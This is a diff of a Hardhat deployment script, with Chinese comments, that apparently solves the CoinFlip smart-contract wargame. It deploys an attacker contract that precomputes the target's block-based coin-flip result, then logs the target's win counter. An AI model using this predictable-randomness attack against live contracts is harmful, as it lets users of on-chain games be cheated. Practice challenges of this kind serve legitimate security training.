@@ -1,9 +1,13 @@
 const { ethers } = require("hardhat");
 
+/* 
+* 预先计算攻击
+实现方式：通过攻击合约预先计算预测值，实现与目标合约值一致
+*/
 // CoinFlip合约地址
 const CoinFlipAddress = "0xfBe32ca17026224396eE7f16fcf27336B6E482F3";
 
-// 部署CoinFlipHacker合约
+// 部署CoinFlip攻击合约
 async function DeployCoinFlipHacker() {
     const CoinFlipHacker = await ethers.getContractFactory("CoinFlipHacker"); // 获取Counter合约工厂
     const coinFlipHacker = await CoinFlipHacker.deploy(CoinFlipAddress); // 部署Counter合约
@@ -19,10 +23,10 @@ async function CoinFlipHackerScript() {
 
     const CoinFlipHackerAddress = await DeployCoinFlipHacker();
 
-    // 加载CoinFlipHacker合约
+    // 加载攻击合约
     const coinFlipHacker = await ethers.getContractAt("CoinFlipHacker", CoinFlipHackerAddress);
 
-    // 加载CoinFlip合约
+    // 加载目标合约
     const coinFlip = await ethers.getContractAt("CoinFlip", CoinFlipAddress);
 
     console.log("攻击前 consecutiveWins = ", await coinFlip.consecutiveWins())
